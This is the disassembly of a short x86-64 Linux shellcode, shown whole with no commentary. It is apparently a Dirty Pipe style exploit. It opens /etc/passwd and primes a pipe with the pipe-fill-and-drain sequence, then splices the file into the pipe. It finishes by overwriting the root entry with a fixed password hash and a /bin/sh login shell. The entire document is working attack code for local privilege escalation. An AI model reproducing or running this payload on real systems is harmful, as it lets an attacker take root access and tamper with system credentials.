0000000000401000 <.shellcode>:
  401000:	68 72 76 65 01       	pushq  $0x1657672
  401005:	81 34 24 01 01 01 01 	xorl   $0x1010101,(%rsp)
  40100c:	48 b8 2f 65 74 63 2f 	movabs $0x7361702f6374652f,%rax
  401013:	70 61 73 
  401016:	50                   	push   %rax
  401017:	48 89 e6             	mov    %rsp,%rsi
  40101a:	6a 9c                	pushq  $0xffffffffffffff9c
  40101c:	5f                   	pop    %rdi
  40101d:	31 d2                	xor    %edx,%edx
  40101f:	31 c0                	xor    %eax,%eax
  401021:	66 b8 01 01          	mov    $0x101,%ax
  401025:	0f 05                	syscall 
  401027:	48 83 ec 10          	sub    $0x10,%rsp
  40102b:	48 89 e7             	mov    %rsp,%rdi
  40102e:	6a 16                	pushq  $0x16
  401030:	58                   	pop    %rax
  401031:	0f 05                	syscall 
  401033:	6a 05                	pushq  $0x5
  401035:	5f                   	pop    %rdi
  401036:	31 f6                	xor    %esi,%esi
  401038:	66 be 08 04          	mov    $0x408,%si
  40103c:	6a 48                	pushq  $0x48
  40103e:	58                   	pop    %rax
  40103f:	0f 05                	syscall 
  401041:	49 89 c7             	mov    %rax,%r15
  401044:	4d 89 fe             	mov    %r15,%r14
  401047:	6a 05                	pushq  $0x5
  401049:	5f                   	pop    %rdi
  40104a:	48 81 ec 00 10 00 00 	sub    $0x1000,%rsp
  401051:	48 89 e6             	mov    %rsp,%rsi
  401054:	31 d2                	xor    %edx,%edx
  401056:	b6 10                	mov    $0x10,%dh
  401058:	4d 85 ff             	test   %r15,%r15
  40105b:	74 0a                	je     0x401067
  40105d:	6a 01                	pushq  $0x1
  40105f:	58                   	pop    %rax
  401060:	0f 05                	syscall 
  401062:	49 29 d7             	sub    %rdx,%r15
  401065:	eb f1                	jmp    0x401058
  401067:	4d 89 f7             	mov    %r14,%r15
  40106a:	6a 04                	pushq  $0x4
  40106c:	5f                   	pop    %rdi
  40106d:	4d 85 ff             	test   %r15,%r15
  401070:	74 09                	je     0x40107b
  401072:	31 c0                	xor    %eax,%eax
  401074:	0f 05                	syscall 
  401076:	49 29 d7             	sub    %rdx,%r15
  401079:	eb f2                	jmp    0x40106d
  40107b:	6a 03                	pushq  $0x3
  40107d:	45 31 d2             	xor    %r10d,%r10d
  401080:	6a 01                	pushq  $0x1
  401082:	41 58                	pop    %r8
  401084:	45 31 c9             	xor    %r9d,%r9d
  401087:	6a 03                	pushq  $0x3
  401089:	5f                   	pop    %rdi
  40108a:	6a 05                	pushq  $0x5
  40108c:	5a                   	pop    %rdx
  40108d:	48 89 e6             	mov    %rsp,%rsi
  401090:	31 c0                	xor    %eax,%eax
  401092:	66 b8 13 01          	mov    $0x113,%ax
  401096:	0f 05                	syscall 
  401098:	68 72 69 0b 01       	pushq  $0x10b6972
  40109d:	81 34 24 01 01 01 01 	xorl   $0x1010101,(%rsp)
  4010a4:	48 b8 3a 2f 3a 2f 62 	movabs $0x2f6e69622f3a2f3a,%rax
  4010ab:	69 6e 2f 
  4010ae:	50                   	push   %rax
  4010af:	48 b8 62 79 2f 3a 30 	movabs $0x3a303a303a2f7962,%rax
  4010b6:	3a 30 3a 
  4010b9:	50                   	push   %rax
  4010ba:	48 b8 73 61 6d 47 70 	movabs $0x4c476f70476d6173,%rax
  4010c1:	6f 47 4c 
  4010c4:	50                   	push   %rax
  4010c5:	48 b8 4b 37 6d 32 33 	movabs $0x754a4733326d374b,%rax
  4010cc:	47 4a 75 
  4010cf:	50                   	push   %rax
  4010d0:	48 b8 3a 24 31 24 24 	movabs $0x505271242431243a,%rax
  4010d7:	71 52 50 
  4010da:	50                   	push   %rax
  4010db:	48 89 e6             	mov    %rsp,%rsi
  4010de:	6a 05                	pushq  $0x5
  4010e0:	5f                   	pop    %rdi
  4010e1:	6a 2b                	pushq  $0x2b
  4010e3:	5a                   	pop    %rdx
  4010e4:	6a 01                	pushq  $0x1
  4010e6:	58                   	pop    %rax
  4010e7:	0f 05                	syscall 
  4010e9:	31 ff                	xor    %edi,%edi
  4010eb:	31 c0                	xor    %eax,%eax
  4010ed:	b0 e7                	mov    $0xe7,%al
  4010ef:	0f 05                	syscall
 
